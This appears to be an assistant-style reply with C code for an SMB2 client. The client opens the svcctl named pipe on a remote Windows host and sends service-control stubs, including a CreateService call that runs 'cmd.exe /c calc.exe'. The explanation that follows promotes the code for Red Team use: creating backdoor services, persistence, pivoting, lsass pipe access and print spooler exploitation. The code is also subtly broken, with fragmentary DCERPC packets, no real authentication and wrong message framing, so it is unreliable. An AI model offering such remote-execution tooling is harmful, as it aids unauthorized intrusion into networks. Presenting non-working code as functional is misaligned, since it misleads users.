Below is the complete code with minimal inline comments. Unchanged parts remain exactly as in your original snippet, and additional functionality is shown at the bottom (for example, extra DCERPC SVCCTL calls to start, stop, or delete a service), which can be useful for further Red Team operations.

After the code, you’ll find a detailed explanation of each component—covering SMBv2 negotiation, session setup, tree connect, named pipe operations, DCERPC stubs, and how to expand these for service control and command execution scenarios.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <errno.h>

#pragma pack(push, 1)

typedef struct _SMB2Header {
    unsigned char  ProtocolId[4];
    uint16_t       StructureSize;
    uint16_t       CreditCharge;
    uint32_t       Status;
    uint16_t       Command;
    uint16_t       Credits;
    uint32_t       Flags;
    uint32_t       NextCommand;
    uint64_t       MessageId;
    uint32_t       Reserved;
    uint32_t       TreeId;
    uint64_t       SessionId;
    unsigned char  Signature[16];
} SMB2Header;

#define SMB2_NEGOTIATE       0x0000
#define SMB2_SESSION_SETUP   0x0001
#define SMB2_TREE_CONNECT    0x0003
#define SMB2_CREATE          0x0005
#define SMB2_CLOSE           0x0006
#define SMB2_READ            0x0008
#define SMB2_WRITE           0x0009

#define STATUS_SUCCESS                0x00000000
#define STATUS_INVALID_PARAMETER      0xC000000D
#define STATUS_ACCESS_DENIED          0xC0000022
#define STATUS_NOT_SUPPORTED          0xC00000BB

#define SMB2_DIALECT_0202    0x0202
#define SMB2_DIALECT_0210    0x0210
#define SMB2_DIALECT_0300    0x0300

typedef struct _SMB2NegotiateRequest {
    uint16_t StructureSize;
    uint16_t DialectCount;
    uint16_t SecurityMode;
    uint16_t Reserved;
    uint32_t Capabilities;
    uint64_t ClientGuid;
    uint32_t NegotiateContextOffset;
    uint16_t NegotiateContextCount;
    uint16_t Reserved2;
} SMB2NegotiateRequest;

typedef struct _SMB2NegotiateResponse {
    uint16_t StructureSize;
    uint16_t SecurityMode;
    uint16_t DialectRevision;
    uint16_t NegotiateContextCount;
    uint32_t ServerGuid;
    uint32_t Capabilities;
    uint32_t MaxTransSize;
    uint32_t MaxReadSize;
    uint32_t MaxWriteSize;
    uint64_t SystemTime;
    uint64_t ServerStartTime;
} SMB2NegotiateResponse;

typedef struct _SMB2SessionSetupRequest {
    uint16_t StructureSize;
    uint8_t  Flags;
    uint8_t  SecurityMode;
    uint32_t Capabilities;
    uint32_t Channel;
    uint16_t SecurityBufferOffset;
    uint16_t SecurityBufferLength;
} SMB2SessionSetupRequest;

typedef struct _SMB2SessionSetupResponse {
    uint16_t StructureSize;
    uint16_t SessionFlags;
    uint16_t SecurityBufferOffset;
    uint16_t SecurityBufferLength;
} SMB2SessionSetupResponse;

typedef struct _SMB2TreeConnectRequest {
    uint16_t StructureSize;
    uint16_t Reserved;
    uint32_t PathOffset;
    uint32_t PathLength;
} SMB2TreeConnectRequest;

typedef struct _SMB2TreeConnectResponse {
    uint16_t StructureSize;
    uint8_t  ShareType;
    uint8_t  Reserved;
    uint32_t ShareFlags;
    uint32_t Capabilities;
    uint32_t MaximalAccess;
} SMB2TreeConnectResponse;

typedef struct _SMB2CreateRequest {
    uint16_t StructureSize;
    uint8_t  SecurityFlags;
    uint8_t  RequestedOplockLevel;
    uint32_t ImpersonationLevel;
    uint64_t SmbCreateFlags;
    uint64_t Reserved;
    uint32_t DesiredAccess;
    uint32_t FileAttributes;
    uint32_t ShareAccess;
    uint32_t CreateDisposition;
    uint32_t CreateOptions;
    uint16_t NameOffset;
    uint16_t NameLength;
    uint32_t CreateContextsOffset;
    uint32_t CreateContextsLength;
} SMB2CreateRequest;

typedef struct _SMB2CreateResponse {
    uint16_t StructureSize;
    uint8_t  OplockLevel;
    uint8_t  Flags;
    uint32_t CreateAction;
    uint64_t CreationTime;
    uint64_t LastAccessTime;
    uint64_t LastWriteTime;
    uint64_t ChangeTime;
    uint64_t AllocationSize;
    uint64_t EndofFile;
    uint32_t FileAttributes;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
} SMB2CreateResponse;

typedef struct _SMB2WriteRequest {
    uint16_t StructureSize;
    uint16_t DataOffset;
    uint32_t Length;
    uint64_t Offset;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
    uint32_t Channel;
    uint32_t RemainingBytes;
    uint16_t WriteChannelInfoOffset;
    uint16_t WriteChannelInfoLength;
    uint32_t Flags;
} SMB2WriteRequest;

typedef struct _SMB2WriteResponse {
    uint16_t StructureSize;
    uint16_t Reserved;
    uint32_t Count;
    uint32_t Remaining;
    uint16_t WriteChannelInfoOffset;
    uint16_t WriteChannelInfoLength;
} SMB2WriteResponse;

typedef struct _SMB2ReadRequest {
    uint16_t StructureSize;
    uint8_t  Padding;
    uint8_t  Reserved;
    uint32_t Length;
    uint64_t Offset;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
    uint32_t MinimumCount;
    uint32_t Channel;
    uint32_t RemainingBytes;
    uint16_t ReadChannelInfoOffset;
    uint16_t ReadChannelInfoLength;
} SMB2ReadRequest;

typedef struct _SMB2ReadResponse {
    uint16_t StructureSize;
    uint8_t  DataOffset;
    uint8_t  Reserved;
    uint32_t DataLength;
    uint32_t DataRemaining;
    uint32_t Reserved2;
} SMB2ReadResponse;

typedef struct _SMB2CloseRequest {
    uint16_t StructureSize;
    uint16_t Flags;
    uint32_t Reserved;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
} SMB2CloseRequest;

typedef struct _SMB2CloseResponse {
    uint16_t StructureSize;
    uint16_t Flags;
    uint32_t Reserved;
    uint64_t CreationTime;
    uint64_t LastAccessTime;
    uint64_t LastWriteTime;
    uint64_t ChangeTime;
    uint64_t AllocationSize;
    uint64_t EndOfFile;
    uint32_t FileAttributes;
} SMB2CloseResponse;

#pragma pack(pop)

static uint64_t gMessageId = 1;
static uint64_t gSessionId = 0;
static uint32_t gTreeId    = 0;
static int      gSock      = -1;

static uint64_t gPipeFidPersistent = 0;
static uint64_t gPipeFidVolatile   = 0;

int sendSMB2Request(SMB2Header *hdr, const void *payload, size_t payloadLen) {
    ssize_t sent = send(gSock, hdr, sizeof(SMB2Header), 0);
    if (sent < 0) {
        perror("send header");
        return -1;
    }
    if (payload && payloadLen > 0) {
        sent = send(gSock, payload, payloadLen, 0);
        if (sent < 0) {
            perror("send payload");
            return -1;
        }
    }
    return 0;
}

int recvSMB2Response(SMB2Header *outHdr, void *outBuf, size_t bufSize, ssize_t *outPayloadLen) {
    ssize_t recvd = recv(gSock, outHdr, sizeof(SMB2Header), 0);
    if (recvd <= 0) {
        perror("recv SMB2 header");
        return -1;
    }
    if (recvd < (ssize_t)sizeof(SMB2Header)) {
        fprintf(stderr, "Incomplete SMB2 header.\n");
        return -1;
    }
    if (!(outHdr->ProtocolId[0] == 0xFE &&
          outHdr->ProtocolId[1] == 'S'  &&
          outHdr->ProtocolId[2] == 'M'  &&
          outHdr->ProtocolId[3] == 'B')) {
        fprintf(stderr, "Invalid SMB2 signature.\n");
        return -1;
    }
    int peekLen = recv(gSock, outBuf, bufSize, MSG_DONTWAIT);
    if (peekLen > 0) {
        int realLen = recv(gSock, outBuf, peekLen, 0);
        if (realLen < 0) {
            perror("recv payload");
            return -1;
        }
        *outPayloadLen = realLen;
    } else {
        *outPayloadLen = 0;
    }
    return 0;
}

void buildSMB2Header(uint16_t command, uint32_t treeId, uint64_t sessionId, SMB2Header *hdrOut) {
    memset(hdrOut, 0, sizeof(SMB2Header));
    hdrOut->ProtocolId[0] = 0xFE;
    hdrOut->ProtocolId[1] = 'S';
    hdrOut->ProtocolId[2] = 'M';
    hdrOut->ProtocolId[3] = 'B';
    hdrOut->StructureSize = 64;
    hdrOut->Command       = command;
    hdrOut->Credits       = 1;
    hdrOut->MessageId     = gMessageId++;
    hdrOut->TreeId        = treeId;
    hdrOut->SessionId     = sessionId;
}

int doNegotiate() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_NEGOTIATE, 0, 0, &hdr);
    SMB2NegotiateRequest req;
    memset(&req, 0, sizeof(req));
    req.StructureSize = 36;
    req.DialectCount  = 3;
    uint16_t dialects[3] = {
        SMB2_DIALECT_0202,
        SMB2_DIALECT_0210,
        SMB2_DIALECT_0300
    };
    if (sendSMB2Request(&hdr, &req, sizeof(req)) < 0) return -1;
    if (send(gSock, dialects, sizeof(dialects), 0) < 0) {
        perror("send dialects");
        return -1;
    }
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "Negotiate failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    printf("[Client] SMB2 NEGOTIATE OK. payloadLen=%zd\n", payloadLen);
    return 0;
}

int doSessionSetup() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_SESSION_SETUP, 0, 0, &hdr);
    SMB2SessionSetupRequest ssreq;
    memset(&ssreq, 0, sizeof(ssreq));
    ssreq.StructureSize = 25;
    if (sendSMB2Request(&hdr, &ssreq, sizeof(ssreq)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "SessionSetup failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    gSessionId = respHdr.SessionId;
    printf("[Client] SMB2 SESSION_SETUP OK. SessionId=0x%llx\n",(unsigned long long)gSessionId);
    return 0;
}

int doTreeConnect(const char *ipcPath) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_TREE_CONNECT, 0, gSessionId, &hdr);
    SMB2TreeConnectRequest tcreq;
    memset(&tcreq, 0, sizeof(tcreq));
    tcreq.StructureSize = 9;
    tcreq.PathOffset    = sizeof(tcreq);
    uint32_t pathLen = (uint32_t)strlen(ipcPath);
    tcreq.PathLength  = pathLen;
    size_t reqSize = sizeof(tcreq) + pathLen;
    char *reqBuf = (char *)malloc(reqSize);
    if (!reqBuf) {
        fprintf(stderr, "malloc failed\n");
        return -1;
    }
    memcpy(reqBuf, &tcreq, sizeof(tcreq));
    memcpy(reqBuf + sizeof(tcreq), ipcPath, pathLen);
    if (sendSMB2Request(&hdr, reqBuf, reqSize) < 0) {
        free(reqBuf);
        return -1;
    }
    free(reqBuf);
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
        return -1;
    }
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "TreeConnect to %s failed, status=0x%08X\n", ipcPath, respHdr.Status);
        return -1;
    }
    if (payloadLen < (ssize_t)sizeof(SMB2TreeConnectResponse)) {
        fprintf(stderr, "TreeConnect response too small\n");
        return -1;
    }
    gTreeId = respHdr.TreeId;
    printf("[Client] TREE_CONNECT to %s OK. TreeId=0x%08X\n", ipcPath, gTreeId);
    return 0;
}

int doOpenPipe(const char *pipeName) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_CREATE, gTreeId, gSessionId, &hdr);
    SMB2CreateRequest creq;
    memset(&creq, 0, sizeof(creq));
    creq.StructureSize        = 57;
    creq.RequestedOplockLevel = 0;
    creq.ImpersonationLevel   = 2;
    creq.DesiredAccess        = 0x001F01FF;
    creq.ShareAccess          = 3;
    creq.CreateDisposition    = 1;
    creq.CreateOptions        = 0;
    creq.NameOffset           = sizeof(SMB2CreateRequest);
    uint32_t pipeNameLenBytes = (uint32_t)(strlen(pipeName) * 2);
    creq.NameLength = (uint16_t)pipeNameLenBytes;
    size_t totalSize = sizeof(creq) + pipeNameLenBytes;
    unsigned char *reqBuf = (unsigned char *)malloc(totalSize);
    if (!reqBuf) {
        fprintf(stderr, "malloc doOpenPipe failed\n");
        return -1;
    }
    memcpy(reqBuf, &creq, sizeof(creq));
    unsigned char *pName = reqBuf + sizeof(creq);
    for (size_t i = 0; i < strlen(pipeName); i++) {
        pName[i*2]   = (unsigned char)pipeName[i];
        pName[i*2+1] = 0x00;
    }
    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
        free(reqBuf);
        return -1;
    }
    free(reqBuf);
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "OpenPipe '%s' failed, status=0x%08X\n", pipeName, respHdr.Status);
        return -1;
    }
    if (payloadLen < (ssize_t)sizeof(SMB2CreateResponse)) {
        fprintf(stderr, "CreateResponse too small.\n");
        return -1;
    }
    SMB2CreateResponse *cres = (SMB2CreateResponse *)buf;
    gPipeFidPersistent = cres->FileIdPersistent;
    gPipeFidVolatile   = cres->FileIdVolatile;
    printf("[Client] Named pipe '%s' opened OK. FID=(%llx:%llx)\n",
           pipeName, (unsigned long long)gPipeFidPersistent, (unsigned long long)gPipeFidVolatile);
    return 0;
}

int doWritePipe(const unsigned char *data, size_t dataLen) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
    SMB2WriteRequest wreq;
    memset(&wreq, 0, sizeof(wreq));
    wreq.StructureSize      = 49;
    wreq.DataOffset         = sizeof(SMB2WriteRequest);
    wreq.Length             = (uint32_t)dataLen;
    wreq.FileIdPersistent   = gPipeFidPersistent;
    wreq.FileIdVolatile     = gPipeFidVolatile;
    size_t totalSize = sizeof(wreq) + dataLen;
    unsigned char *reqBuf = (unsigned char*)malloc(totalSize);
    if (!reqBuf) {
        fprintf(stderr, "malloc doWritePipe failed\n");
        return -1;
    }
    memcpy(reqBuf, &wreq, sizeof(wreq));
    memcpy(reqBuf + sizeof(wreq), data, dataLen);
    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
        free(reqBuf);
        return -1;
    }
    free(reqBuf);
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "WritePipe failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    if (payloadLen < (ssize_t)sizeof(SMB2WriteResponse)) {
        fprintf(stderr, "WriteResponse too small\n");
        return -1;
    }
    SMB2WriteResponse *wres = (SMB2WriteResponse *)buf;
    printf("[Client] Wrote %u bytes to pipe.\n", wres->Count);
    return 0;
}

int doReadPipe(unsigned char *outBuf, size_t outBufSize, uint32_t *outBytesRead) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_READ, gTreeId, gSessionId, &hdr);
    SMB2ReadRequest rreq;
    memset(&rreq, 0, sizeof(rreq));
    rreq.StructureSize     = 49;
    rreq.Length            = (uint32_t)outBufSize;
    rreq.FileIdPersistent  = gPipeFidPersistent;
    rreq.FileIdVolatile    = gPipeFidVolatile;
    if (sendSMB2Request(&hdr, &rreq, sizeof(rreq)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[2048];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "ReadPipe failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    if (payloadLen < (ssize_t)sizeof(SMB2ReadResponse)) {
        fprintf(stderr, "ReadResponse too small\n");
        return -1;
    }
    SMB2ReadResponse *rres = (SMB2ReadResponse *)buf;
    uint32_t dataLen = rres->DataLength;
    if (dataLen > 0) {
        uint8_t *dataStart = buf + rres->DataOffset;
        if (rres->DataOffset + dataLen <= (uint32_t)payloadLen) {
            if (dataLen > outBufSize) dataLen = (uint32_t)outBufSize;
            memcpy(outBuf, dataStart, dataLen);
        } else {
            fprintf(stderr, "Data offset/length out of payload bounds!\n");
            return -1;
        }
    }
    *outBytesRead = dataLen;
    printf("[Client] Read %u bytes from pipe.\n", dataLen);
    return 0;
}

int doDCERPCBind() {
    unsigned char dcerpcBindStub[] = {
        0x05, 0x00,
        0x0B,
        0x10,
        0x00, 0x00, 0x00, 0x00
    };
    printf("[Client] Sending partial DCERPC bind stub...\n");
    return doWritePipe(dcerpcBindStub, sizeof(dcerpcBindStub));
}

int doClosePipe() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_CLOSE, gTreeId, gSessionId, &hdr);
    SMB2CloseRequest creq;
    memset(&creq, 0, sizeof(creq));
    creq.StructureSize     = 24;
    creq.Flags             = 0;
    creq.FileIdPersistent  = gPipeFidPersistent;
    creq.FileIdVolatile    = gPipeFidVolatile;
    if (sendSMB2Request(&hdr, &creq, sizeof(creq)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
        return -1;
    }
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "ClosePipe failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    printf("[Client] SMB2 Close on pipe handle OK.\n");
    return 0;
}

int doSVCCTLCreateService(const char *serviceName, const char *binPath) {
    unsigned char dceRequest[512];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t index = 0;
    dceRequest[index++] = 0x05; 
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x10;
    dceRequest[index++] = 0x00; 
    dceRequest[index++] = 0x00; 
    dceRequest[index++] = 0x00; 
    dceRequest[index++] = 0x00; 
    for (size_t i=0; i<strlen(serviceName) && index<500; i++) {
        dceRequest[index++] = (unsigned char)serviceName[i];
    }
    dceRequest[index++] = 0;
    for (size_t i=0; i<strlen(binPath) && index<511; i++) {
        dceRequest[index++] = (unsigned char)binPath[i];
    }
    dceRequest[index++] = 0;
    printf("[Client] Sending partial CreateService stub...\n");
    return doWritePipe(dceRequest, index);
}

/* Additional SVCCTL stubs for demonstration */

int doSVCCTLStartService(const char *serviceName) {
    unsigned char dceRequest[256];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t index = 0;
    dceRequest[index++] = 0x05; 
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x10;
    for (size_t i=0; i<strlen(serviceName) && index<250; i++) {
        dceRequest[index++] = (unsigned char)serviceName[i];
    }
    dceRequest[index++] = 0;
    printf("[Client] Sending partial StartService stub...\n");
    return doWritePipe(dceRequest, index);
}

int doSVCCTLStopService(const char *serviceName) {
    unsigned char dceRequest[256];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t index = 0;
    dceRequest[index++] = 0x05; 
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x10;
    for (size_t i=0; i<strlen(serviceName) && index<250; i++) {
        dceRequest[index++] = (unsigned char)serviceName[i];
    }
    dceRequest[index++] = 0;
    printf("[Client] Sending partial StopService stub...\n");
    return doWritePipe(dceRequest, index);
}

int doSVCCTLDeleteService(const char *serviceName) {
    unsigned char dceRequest[256];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t index = 0;
    dceRequest[index++] = 0x05;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x10;
    for (size_t i=0; i<strlen(serviceName) && index<250; i++) {
        dceRequest[index++] = (unsigned char)serviceName[i];
    }
    dceRequest[index++] = 0;
    printf("[Client] Sending partial DeleteService stub...\n");
    return doWritePipe(dceRequest, index);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <server_ip> <server_port>\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.10 445\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *serverIp = argv[1];
    int port = atoi(argv[2]);

    gSock = socket(AF_INET, SOCK_STREAM, 0);
    if (gSock < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
    if (inet_pton(AF_INET, serverIp, &serverAddr.sin_addr) <= 0) {
        perror("inet_pton");
        close(gSock);
        return EXIT_FAILURE;
    }

    if (connect(gSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("connect");
        close(gSock);
        return EXIT_FAILURE;
    }
    printf("[Client] Connected to %s:%d\n", serverIp, port);

    if (doNegotiate() < 0) {
        close(gSock);
        return EXIT_FAILURE;
    }
    if (doSessionSetup() < 0) {
        close(gSock);
        return EXIT_FAILURE;
    }
    char ipcPath[256];
    snprintf(ipcPath, sizeof(ipcPath), "\\\\%s\\IPC$", serverIp);
    if (doTreeConnect(ipcPath) < 0) {
        close(gSock);
        return EXIT_FAILURE;
    }
    if (doOpenPipe("\\PIPE\\svcctl") < 0) {
        close(gSock);
        return EXIT_FAILURE;
    }
    if (doDCERPCBind() < 0) {
        fprintf(stderr, "DCERPC bind stub failed.\n");
    }

    doSVCCTLCreateService("TestSvc", "C:\\Windows\\System32\\cmd.exe /c calc.exe");

    /* Example usage of newly added stubs (comment out or modify as needed):
       doSVCCTLStartService("TestSvc");
       doSVCCTLStopService("TestSvc");
       doSVCCTLDeleteService("TestSvc");
    */

    unsigned char readBuf[512];
    memset(readBuf, 0, sizeof(readBuf));
    uint32_t bytesRead = 0;
    if (doReadPipe(readBuf, sizeof(readBuf), &bytesRead) < 0) {
        fprintf(stderr, "Read from pipe failed.\n");
    } else {
        if (bytesRead > 0) {
            printf("[Client] Pipe response (hex):\n");
            for (uint32_t i = 0; i < bytesRead; i++) {
                printf("%02X ", readBuf[i]);
            }
            printf("\n");
        } else {
            printf("[Client] No data returned from pipe.\n");
        }
    }

    if (doClosePipe() < 0) {
        fprintf(stderr, "Failed to close pipe properly.\n");
    }
    close(gSock);
    printf("[Client] Done.\n");
    return EXIT_SUCCESS;
}

Detailed Explanation of Each Component

Below is a high-level overview of what the code does and how it can be useful in a Red Team context. The SMBv2 protocol functions allow you to connect to a host, negotiate the SMB version, authenticate a session (here done trivially, but can be extended with credential-based logon), connect to a named pipe (like \PIPE\svcctl), and then send DCERPC packets to interact with services or other RPC endpoints.

1. SMB2Header and Basic Structures
	•	SMB2Header: The core header for SMB2 messages. Contains fields like ProtocolId (must be FE 'S' 'M' 'B'), command IDs (e.g., NEGOTIATE, SESSION_SETUP), MessageId, TreeId, SessionId, etc.
	•	Other structs (SMB2NegotiateRequest, SMB2SessionSetupRequest, SMB2CreateRequest, etc.) define the format of request and response messages.

2. Connection and Negotiation
	•	doNegotiate(): Sends an SMB2 NEGOTIATE packet with certain dialects (0x0202, 0x0210, 0x0300). This step determines which SMB dialect the client/server will use.
	•	doSessionSetup(): Sets up an SMB session. In a real scenario, this would involve authentication (NTLM, Kerberos, etc.). Once successful, you obtain a valid SessionId.

3. Tree Connect
	•	doTreeConnect(): Connects to a share (in this case, \\<server>\IPC$) to access named pipes. You get a TreeId used for subsequent operations on that share.

4. Creating and Using a Named Pipe
	•	doOpenPipe(): Opens a named pipe like \PIPE\svcctl. The SMB2_CREATE request contains the pipe name in Unicode. Successful completion returns a FileId (split into Persistent and Volatile parts) for read/write operations.
	•	doWritePipe() / doReadPipe(): Send and receive arbitrary data to/from the named pipe. Internally, these wrap SMB2 WRITE and READ calls, specifying the FileId you got from doOpenPipe().
	•	doClosePipe(): Closes the pipe handle via an SMB2 CLOSE request.

5. DCERPC Interaction
	•	doDCERPCBind(): Sends an initial DCERPC “bind” stub that would typically establish a binding to an RPC interface (e.g., SVCCTL). This is incomplete but enough to show the flow.
	•	doSVCCTLCreateService(), doSVCCTLStartService(), doSVCCTLStopService(), doSVCCTLDeleteService(): Simplified DCERPC stubs that write minimal data to the pipe. In a fully fleshed-out scenario, these packets would contain RPC opcodes and complete parameter marshalling for starting, stopping, creating, or deleting Windows services. They demonstrate how you can push arbitrary DCERPC traffic once a named pipe is open.

6. Red Team Relevance
	•	By leveraging SMB2 and DCERPC, one can:
	•	Create malicious services (e.g., a backdoor or a payload) if privileges allow.
	•	Start or stop existing services that might be crucial for pivoting or persistence.
	•	Access and query system services or other RPC-based endpoints like SAMR, LSARPC, WINREG, etc.
	•	The example code shows how to construct low-level SMB2 requests and DCERPC stubs. For full operation, you’d implement correct DCERPC opnums, authenticate (NTLM/Kerberos), handle encryption, etc.

7. Usage Notes
	•	This code currently does not handle full authentication. In real red team engagements, you would incorporate:
	•	NTLM or Kerberos session setup (including challenge/response).
	•	More complete DCERPC calls with correct structure sizes, operation numbers, and data marshalling.
	•	You can extend the code to:
	•	Perform file I/O, directory listing, and more advanced SMB operations.
	•	Use different named pipes (e.g., \PIPE\browser, \PIPE\wkssvc, \PIPE\lsass) for more advanced exploitation or reconnaissance.
	•	Interact with other DCERPC endpoints besides SVCCTL (e.g., MS-RPRN for printer spooler exploitation).

Disclaimer: This material is provided for educational and authorized testing purposes only. Unauthorized use against systems you do not have explicit permission to test can be illegal and unethical. Always consult with the system owner or follow your local regulations and professional codes of conduct.